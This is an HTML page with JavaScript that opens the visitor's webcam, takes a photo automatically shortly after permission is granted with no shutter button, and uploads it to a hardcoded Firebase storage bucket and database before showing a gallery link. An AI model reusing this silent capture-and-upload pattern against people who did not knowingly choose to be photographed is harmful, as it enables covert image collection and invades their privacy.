<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Capture Selfie</title>
</head>
<body>
    <h2>Opening Camera...</h2>

    <video id="video" autoplay playsinline style="width: 320px; display:block; margin-top:20px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-storage-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>

    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
            authDomain: "esrat-4e28f.firebaseapp.com",
            databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
            projectId: "esrat-4e28f",
            storageBucket: "esrat-4e28f.firebasestorage.app",
            messagingSenderId: "712315598095",
            appId: "1:712315598095:web:xxxx"
        };

        firebase.initializeApp(firebaseConfig);
        const storage = firebase.storage();
        const db = firebase.database();

        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");

        // START CAMERA
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Wait until the video stream is ready
                video.onloadedmetadata = () => {
                    setTimeout(captureSelfie, 800); // capture after camera starts
                };
            })
            .catch(err => {
                alert("Camera permission denied.");
                console.error(err);
            });

        function captureSelfie() {
            const w = video.videoWidth;
            const h = video.videoHeight;

            canvas.width = w;
            canvas.height = h;

            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, w, h);

            canvas.toBlob(blob => {
                if (!blob) {
                    alert("Failed to capture image.");
                    return;
                }
                uploadBlob(blob);
            }, "image/jpeg", 0.95);
        }

        function uploadBlob(blob) {
            const filename = "selfies/" + Date.now() + ".jpg";
            const ref = storage.ref().child(filename);

            ref.put(blob)
                .then(snapshot => snapshot.ref.getDownloadURL())
                .then(url => {
                    return db.ref("selfies").push(url);
                })
                .then(() => {
                    document.body.innerHTML = `
                        <h2>Selfie Uploaded Successfully!</h2>
                        <p><a href="gallery.html">View Gallery</a></p>
                    `;
                })
                .catch(err => {
                    alert("Upload failed!");
                    console.error(err);
                });
        }
    </script>
</body>
</html>
